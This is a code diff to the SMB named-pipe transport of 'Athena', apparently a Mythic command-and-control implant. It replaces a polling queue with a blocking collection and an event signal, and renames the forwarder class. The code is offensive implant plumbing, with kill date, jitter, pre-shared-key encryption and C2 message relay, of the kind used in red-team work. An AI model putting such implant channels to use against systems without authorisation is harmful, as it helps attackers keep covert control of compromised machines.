@@ -6,6 +6,7 @@ using System.Collections.Concurrent;
 using System.Threading.Tasks;
 using H.Pipes;
 using H.Pipes.Args;
+using System.Threading;
 
 namespace Athena.Config
 {
@@ -16,7 +17,7 @@ namespace Athena.Config
         public DateTime killDate { get; set; }
         public int sleep { get; set; }
         public int jitter { get; set; }
-        public SMBForwarder smbForwarder { get; set; }
+        public Forwarder forwarder { get; set; }
 
         public MythicConfig()
         {
@@ -28,7 +29,7 @@ namespace Athena.Config
             int jitter = 0;
             this.jitter = jitter;
             this.currentConfig = new Smb(this.uuid, this);
-            this.smbForwarder = new SMBForwarder();
+            this.forwarder = new Forwarder();
         }
     }
 
@@ -41,20 +42,21 @@ namespace Athena.Config
         public bool encrypted { get; set; }
         public bool encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
         public PSKCrypto crypt { get; set; }
-        public ConcurrentQueue<DelegateMessage> queueIn { get; set; }
+        public BlockingCollection<DelegateMessage> queueIn { get; set; }
+        private ManualResetEvent onEventHappenedSignal = new ManualResetEvent(false);
 
         public Smb(string uuid, MythicConfig config)
         {
             this.connected = false;
             this.psk = "AESPSK";
-            this.queueIn = new ConcurrentQueue<DelegateMessage>();
+            this.queueIn = new BlockingCollection<DelegateMessage>();
             if (!string.IsNullOrEmpty(this.psk))
             {
                 this.crypt = new PSKCrypto(uuid, this.psk);
                 this.encrypted = true;
             }
             this.serverPipe = new PipeServer<string>(this.pipeName);
-            this.serverPipe.ClientConnected += (o,args) => DoNewConnection();
+            this.serverPipe.ClientConnected += (o, args) => DoNewConnection();
             this.serverPipe.ClientDisconnected += (o, args) => DoClientDisconnect();
             this.serverPipe.MessageReceived += (sender, args) => DoMessageReceive(args);
             this.serverPipe.StartAsync();
@@ -66,7 +68,7 @@ namespace Athena.Config
             {
                 //Add message to out queue.
                 DelegateMessage dm = JsonConvert.DeserializeObject<DelegateMessage>(args.Message);
-                this.queueIn.Enqueue(dm);
+                this.queueIn.Add(dm);
             }
             catch
             {
@@ -77,6 +79,7 @@ namespace Athena.Config
                     message = ""
                 };
             }
+            onEventHappenedSignal.Set(); //Indicate something happened
         }
 
         public async void DoNewConnection()
@@ -87,6 +90,7 @@ namespace Athena.Config
         public async void DoClientDisconnect()
         {
             this.connected = false;
+            onEventHappenedSignal.Set(); //Indicate something happened
         }
 
         //Send, wait for a response, and return it to the main functions
@@ -114,22 +118,38 @@ namespace Athena.Config
                     message = json,
                     c2_profile = "smb"
                 };
-                _ = this.serverPipe.WriteAsync(JsonConvert.SerializeObject(dm));
 
-                DelegateMessage res = new DelegateMessage();
+                await this.serverPipe.WriteAsync(JsonConvert.SerializeObject(dm)); //Write our output
 
-                while (!this.queueIn.TryDequeue(out dm)) { if (!connected) {
-                        return ""; 
-                    } };
+                //Wait for a signal
+                onEventHappenedSignal.WaitOne();
 
-                //Decrypt and return
-                if (this.encrypted)
+                if (!connected) //Our event was a client disconnect
                 {
-                    return this.crypt.Decrypt(dm.message);
+                    onEventHappenedSignal.Reset(); //Reset the event and return empty
+                    return "";
                 }
-                else
+                else //Our event was a new message
                 {
-                    return Misc.Base64Decode(dm.message).Substring(36);
+                    if(this.queueIn.Count > 0) //Check if we actually got a message
+                    {
+                        dm = this.queueIn.Take(); //Take a value from it
+
+                        onEventHappenedSignal.Reset(); //Reset the event and return
+
+                        if (this.encrypted) //Return dm
+                        {
+                            return this.crypt.Decrypt(dm.message);
+                        }
+                        else
+                        {
+                            return Misc.Base64Decode(dm.message).Substring(36);
+                        }
+                    }
+                    else
+                    {
+                        return "";
+                    }
                 }
             }
             catch
